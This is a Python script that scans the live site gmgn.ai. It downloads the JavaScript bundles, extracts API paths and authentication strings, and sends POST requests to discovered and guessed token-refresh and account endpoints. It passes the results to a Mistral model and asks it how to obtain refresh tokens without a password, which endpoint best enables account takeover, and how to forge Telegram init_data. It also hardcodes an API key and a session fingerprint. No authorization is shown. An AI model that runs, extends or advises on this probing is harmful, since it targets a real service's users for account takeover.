#!/usr/bin/env python3
"""
MEGA SCAN: Download JS bundles, extract ALL endpoints, find backend auth
Uses Mistral AI to analyze findings in real-time
"""
import asyncio
import aiohttp
import httpx
import json
import re
import time
from collections import Counter

# Config
with open('tokens.json') as f:
    tokens = json.load(f)
with open('cookies.json') as f:
    cookies = json.load(f)

TOKEN = tokens['access_token']
NARA_KEY = "sk-nry-aiQtuUeowR-ygk-AdvaUygnL6TR_x57Q_sz1BwhfUs4"
P = 'device_id=acf898c7-5063-4d0f-b992-d1e5d568409e&fp_did=5154d56b50e3061629dca8bf8538b346&client_id=gmgn_web_20260713-2044-a7c6bf4&from_app=gmgn&app_ver=20260713-2044-a7c6bf4&tz_name=Asia%2FAden&tz_offset=10800&app_lang=en-US&os=web&worker=0'

HEADERS = {
    'Authorization': f'Bearer {TOKEN}',
    'Content-Type': 'application/json',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
    'Origin': 'https://gmgn.ai',
    'Referer': 'https://gmgn.ai/',
}

def ask_mistral(prompt):
    """Ask Mistral to analyze something"""
    try:
        r = httpx.post("https://router.bynara.id/v1/chat/completions",
            headers={"Authorization": f"Bearer {NARA_KEY}"},
            json={"model": "mistral-large", "max_tokens": 800, "messages": [{"role": "user", "content": prompt}]},
            timeout=30)
        return r.json()["choices"][0]["message"]["content"]
    except:
        return ""

async def main():
    print("="*70)
    print("🔥 MEGA SCAN: JS BUNDLES + ENDPOINT EXTRACTION + BACKEND AUTH HUNT")
    print("="*70)
    
    timeout = aiohttp.ClientTimeout(total=30, connect=5)
    async with aiohttp.ClientSession(timeout=timeout, headers=HEADERS, cookies=cookies) as session:
        
        # ═══════════════════════════════════════════════════════
        # PHASE 1: DOWNLOAD ALL JS BUNDLES FROM GMGN.AI
        # ═══════════════════════════════════════════════════════
        print("\n\n🎯 PHASE 1: DOWNLOADING JS BUNDLES")
        print("-"*70)
        
        # Get main page
        async with session.get("https://gmgn.ai/") as r:
            html = await r.text()
        
        # Extract ALL script URLs
        scripts = re.findall(r'src="([^"]*\.js[^"]*)"', html)
        scripts += re.findall(r'"(/_next/static/[^"]+\.js)"', html)
        scripts = list(set(scripts))
        print(f"  Found {len(scripts)} JS files in HTML")
        
        all_api_paths = Counter()
        all_auth_refs = Counter()
        all_interesting = []
        
        # Download each bundle and grep for API paths
        downloaded = 0
        for script_url in scripts[:30]:  # Cap at 30
            if not script_url.startswith("http"):
                script_url = f"https://gmgn.ai{script_url}"
            
            try:
                async with session.get(script_url) as r:
                    if r.status == 200:
                        js = await r.text()
                        downloaded += 1
                        
                        # Extract API paths
                        api_hits = re.findall(r'["\'`](/(?:tapi|xapi|defi|account|wallet-api|rebate|api|bot-api|backend)/[a-zA-Z0-9_\-/\.]{3,80})["\']', js)
                        for path in api_hits:
                            all_api_paths[path] += 1
                        
                        # Extract auth-related strings
                        auth_patterns = [
                            'refresh_token', 'access_token', 'trade_token',
                            'father_id', 'init_data', 'tg_init_data',
                            'bind_wallet', 'postNonce', 'verify_wallet',
                            'refresh_access_token', 'refresh_refresh_token',
                            'bot_sol_address', 'bot_bsc_address',
                            'wallet_address', 'txn_id', 'session_id',
                            'BroadcastChannel', 'localStorage',
                            'httpOnly', 'sid', 'csrf'
                        ]
                        for pattern in auth_patterns:
                            count = js.count(pattern)
                            if count:
                                all_auth_refs[pattern] += count
                        
                        # Find fetch/axios calls with full URLs
                        fetch_calls = re.findall(r'(?:fetch|post|get|request)\s*\(\s*["`\']([^"`\']{10,100})["`\']', js)
                        for call in fetch_calls:
                            if '/' in call and not call.endswith('.js'):
                                all_interesting.append(call)
                        
                        # Find hostConfig references (backend URLs!)
                        host_configs = re.findall(r'hostConfig\.[a-zA-Z]+\s*[=:]\s*["`\']([^"`\']+)["`\']', js)
                        host_configs += re.findall(r'["\'](https?://[a-z]+\.gmgn\.ai)["\']', js)
                        host_configs += re.findall(r'baseUrl["\']?\s*[:=]\s*["`\']([^"`\']+)["`\']', js)
                        if host_configs:
                            for hc in host_configs:
                                all_interesting.append(f"BACKEND_URL: {hc}")
                        
            except:
                pass
            
            await asyncio.sleep(0.1)
        
        print(f"  Downloaded {downloaded} bundles successfully")
        print(f"  Extracted {len(all_api_paths)} unique API paths")
        print(f"  Found {len(all_interesting)} interesting references")
        
        # Print top API paths
        print(f"\n  📡 TOP 50 API PATHS (from JS bundles):")
        for path, count in all_api_paths.most_common(50):
            print(f"    {count:>3}x  {path}")
        
        # Print auth refs
        print(f"\n  🔑 AUTH-RELATED REFERENCES:")
        for pattern, count in all_auth_refs.most_common(30):
            print(f"    {count:>4}x  {pattern}")
        
        # Print interesting
        if all_interesting:
            print(f"\n  🎯 INTERESTING REFERENCES (backend URLs, fetch calls):")
            for item in set(all_interesting)[:30]:
                print(f"    {item}")
        
        # ═══════════════════════════════════════════════════════
        # PHASE 2: TEST ALL DISCOVERED ENDPOINTS
        # ═══════════════════════════════════════════════════════
        print(f"\n\n🎯 PHASE 2: TESTING TOP ENDPOINTS")
        print("-"*70)
        
        # Filter for most interesting paths
        test_paths = [p for p, _ in all_api_paths.most_common(100)]
        
        # Add backend-specific paths
        test_paths += [
            '/backend/api/v1/user',
            '/backend/auth/token',
            '/defi/auth/v1/refresh_trade_token_by_access',
            '/tapi/v1/refresh_trade_token',
            '/account/refresh_access_token',
            '/account/refresh_refresh_token',
            '/account/postNonce',
            '/account/user_info',
        ]
        
        live_endpoints = []
        
        for path in test_paths[:60]:
            # Clean path
            path = path.split('?')[0]  # Remove query strings
            if '{' in path:
                continue  # Skip template paths
            
            try:
                url = f"https://gmgn.ai{path}?{P}"
                async with session.post(url, json={}) as r:
                    status = r.status
                    if status != 404:
                        body = await r.text()
                        live_endpoints.append({'path': path, 'method': 'POST', 'status': status, 'body': body[:200]})
                        icon = '🔥' if status == 200 else '⚡'
                        print(f"  {icon} POST {path:<55} → {status}")
                        if status == 200:
                            print(f"       {body[:150]}")
            except:
                pass
            
            await asyncio.sleep(0.15)
        
        # ═══════════════════════════════════════════════════════
        # PHASE 3: ASK MISTRAL TO ANALYZE
        # ═══════════════════════════════════════════════════════
        print(f"\n\n🎯 PHASE 3: MISTRAL AI ANALYSIS")
        print("-"*70)
        
        # Give Mistral all the data
        top_paths = [p for p, _ in all_api_paths.most_common(30)]
        backend_refs = [i for i in set(all_interesting) if 'BACKEND' in i or 'http' in i.lower()]
        
        analysis = ask_mistral(f"""You are a security researcher. I extracted these API paths from gmgn.ai JavaScript bundles:

TOP API PATHS: {json.dumps(top_paths[:20])}

BACKEND/URL REFERENCES: {json.dumps(backend_refs[:10])}

AUTH REFERENCES (counts): refresh_token={all_auth_refs.get('refresh_token',0)}, access_token={all_auth_refs.get('access_token',0)}, init_data={all_auth_refs.get('init_data',0)}, postNonce={all_auth_refs.get('postNonce',0)}, BroadcastChannel={all_auth_refs.get('BroadcastChannel',0)}

LIVE ENDPOINTS (not 404): {json.dumps([e['path'] for e in live_endpoints[:15]])}

Questions:
1. What backend auth mechanism is this using?
2. How can an attacker get a refresh_token without a password?
3. What's the most critical endpoint for account takeover?
4. Is there a way to forge the TG init_data?

Be specific and actionable.""")
        
        print(f"\n  🧠 MISTRAL ANALYSIS:\n")
        print(f"  {analysis}")
        
        # Save everything
        results = {
            'api_paths': dict(all_api_paths.most_common(200)),
            'auth_refs': dict(all_auth_refs),
            'interesting': list(set(all_interesting)),
            'live_endpoints': live_endpoints,
            'mistral_analysis': analysis
        }
        with open('MEGA_SCAN_RESULTS.json', 'w') as f:
            json.dump(results, f, indent=2)
        
        print(f"\n\n{'='*70}")
        print(f"📊 MEGA SCAN COMPLETE")
        print(f"{'='*70}")
        print(f"  API paths found: {len(all_api_paths)}")
        print(f"  Live endpoints: {len(live_endpoints)}")
        print(f"  Results saved: MEGA_SCAN_RESULTS.json")

asyncio.run(main())
